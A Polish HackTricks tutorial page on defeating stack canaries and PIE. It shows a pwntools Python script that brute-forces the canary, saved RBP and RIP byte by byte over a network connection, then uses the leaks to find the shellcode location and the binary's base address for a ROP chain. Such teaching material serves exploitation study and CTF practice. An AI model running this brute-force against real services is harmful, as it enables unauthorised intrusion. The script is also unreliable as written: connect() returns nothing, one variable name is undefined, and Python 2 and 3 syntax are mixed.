# Adresy BF na stosie

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

**Jeśli masz do czynienia z binarnym plikiem zabezpieczonym przez canary i PIE (Position Independent Executable), prawdopodobnie będziesz musiał znaleźć sposób na ich obejście.**

![](<../../../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
Zauważ, że **`checksec`** może nie wykryć, że binarny plik jest zabezpieczony przez canary, jeśli został on skompilowany statycznie i nie jest w stanie zidentyfikować funkcji.\
Możesz jednak zauważyć to ręcznie, jeśli zauważysz, że wartość jest zapisywana na stosie na początku wywołania funkcji, a następnie sprawdzana przed wyjściem.
{% endhint %}

## Adresy Brute-Force

Aby ominąć PIE, musisz **wyciec pewien adres**. Jeśli binarny plik nie wycieka żadnych adresów, najlepiej jest **przeprowadzić atak siłowy na RBP i RIP zapisane na stosie** w podatnej funkcji.\
Na przykład, jeśli binarny plik jest zabezpieczony zarówno **canary**, jak i **PIE**, możesz zacząć atak siłowy na canary, a następnie **następne** 8 bajtów (x64) będą zapisane jako **RBP**, a **kolejne** 8 bajtów będą zapisane jako **RIP**.

{% hint style="success" %}
Założenie jest takie, że adres powrotu na stosie należy do kodu binarnego głównego, co w przypadku, gdy podatność znajduje się w kodzie binarnym, zazwyczaj będzie prawdą.
{% endhint %}

Aby przeprowadzić atak siłowy na RBP i RIP z binarnego pliku, możesz ustalić, że poprawny zgadnięty bajt jest poprawny, jeśli program coś wypisze lub po prostu nie ulegnie awarii. **Ta sama funkcja**, co ta używana do ataku siłowego na canary, może być użyta do ataku siłowego na RBP i RIP:
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

# CANARY BF HERE
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary

# PIE BF FROM HERE
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
Ostatnią rzeczą, którą musisz zrobić, aby pokonać PIE, jest obliczenie **użytecznych adresów z wyciekłych** adresów: **RBP** i **RIP**.

Z **RBP** możesz obliczyć **gdzie zapisujesz swój shell na stosie**. Może to być bardzo przydatne, aby wiedzieć, gdzie zamierzasz zapisać ciąg _"/bin/sh\x00"_ wewnątrz stosu. Aby obliczyć odległość między wyciekiem RBP a swoim kodem shell, wystarczy ustawić **punkt przerwania po wycieku RBP** i sprawdzić **gdzie znajduje się twój kod shell**, a następnie obliczyć odległość między kodem shell a RBP:
```python
INI_SHELLCODE = RBP - 1152
```
Z **RIP** można obliczyć **bazowy adres binarny PIE**, który będzie potrzebny do utworzenia **poprawnego łańcucha ROP**.\
Aby obliczyć bazowy adres, wystarczy wykonać `objdump -d vunbinary` i sprawdzić ostatnie adresy rozkładu:

![](<../../../../.gitbook/assets/image (145).png>)

W tym przykładzie widać, że potrzebne jest tylko **1,5 bajta**, aby zlokalizować cały kod, więc w tej sytuacji bazowy adres będzie **przeciekiem RIP, ale kończący się na "000"**. Na przykład, jeśli przeciekłeś `0x562002970ecf`, bazowy adres to `0x562002970000`
```python
elf.address = RIP - (RIP & 0xfff)
```
<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
